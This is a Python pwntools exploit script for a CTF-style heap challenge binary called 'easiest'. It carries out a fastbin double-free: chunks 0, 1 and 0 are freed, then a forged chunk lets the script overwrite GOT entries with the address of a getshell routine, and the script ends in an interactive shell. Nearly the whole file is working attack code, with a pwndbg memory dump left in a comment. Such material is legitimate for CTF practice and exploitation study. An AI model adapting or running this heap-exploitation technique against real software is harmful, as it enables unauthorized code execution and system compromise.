#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-10-31
from pwn import *
context.local(arch='amd64', os='linux')

def add(number, size, content):
    io.sendlineafter("2 delete \n", "1")
    io.sendlineafter("(0-11):", unicode(number))
    io.sendlineafter("Length:", unicode(size))
    io.sendlineafter("C:", content)

def delete(number):
    io.sendlineafter("2 delete \n", "2")
    io.sendlineafter("(0-11):", unicode(number))

    '''
    pwndbg> x/20gx 0x0000000000602000
    0x602000:       0x0000000000601e28      0x00007ffff7ffe168
    0x602010:       0x00007ffff7dee870      0x00007ffff7a914f0
    0x602020:       0x00007ffff7a7c690      0x00007ffff7a7b1a0
    0x602030:       0x0000000000400796      0x00007ffff7a836b0
    0x602040:       0x00000000004007b6      0x00007ffff7a62800
    0x602050:       0x00007ffff7ad9200      0x00007ffff7a2d740
    0x602060:       0x00007ffff7a483c0      0x00007ffff7a91130
    0x602070:       0x00007ffff7a7ce70      0x00007ffff7a784d0
    0x602080:       0x0000000000400836      0x0000000000000000
    0x602090:       0x0000000000000000      0x0000000000000000
    '''

def pwn(io):
    # if local&debug: gdb.attach(io,'break *0x400d1b\n directory /root/Pwn/glibc/glibc-2.23/malloc/')

    size = 0x38 
    add(0, size, "thinkycx" )
    add(1, size, "thinkycx" )
    add(2, size, "thinkycx")

    delete(0)
    delete(1)
    delete(0)
    log.info("fastbin circle has finished!")

    write_addr = 0x602030 + 2 -0x8 # bypass fastbin size check
    # write_addr = 0x602040 + 2 -0x8 # bypass fastbin size check
    # if local&debug: gdb.attach(io,'break *0x400d1b\n directory /root/Pwn/glibc/glibc-2.23/malloc/')
    add(3, size, p64(write_addr) )
    add(4, size, "thinkycx")
    add(5, size, "thinkycx" ) # next fasbins will be write_addr

    getshell = 0x400946
    # if write_addr is 0x602030 + 2 - 0x8
    # payload = "\x00"*6 + p64(elf.plt['system']+6) + p64(elf.plt['printf']) + p64(getshell)*4
    payload = "\x00"*6 + p64(elf.plt['system']+6) +  p64(getshell)*4

    # if write_addr is 0x602040 + 2 - 0x8
    # payload = "\x00"*6 + p64(getshell)*3 # strtol
    # if local&debug: gdb.attach(io,'break *0x400d1b\n directory /root/Pwn/glibc/glibc-2.23/malloc/')
    add(7, size, payload) # when comes to getchice() strol(), call getshell, system@plt+6
    # add(8, 0x100, "getshell!")


if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 1, 1
    # context.log_level = 'debug'
    filename = './easiest'
    elf = ELF(filename)
    if local:
        io = process(filename)
        # io = process(filename, env={"LD_PRELOAD":"/tmp/libc.so"})
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        # context.terminal = ['tmux', '-x', 'sh', '-c']
        context.terminal = ['tmux', 'splitw', '-h' ]
    pwn(io)
    io.interactive()

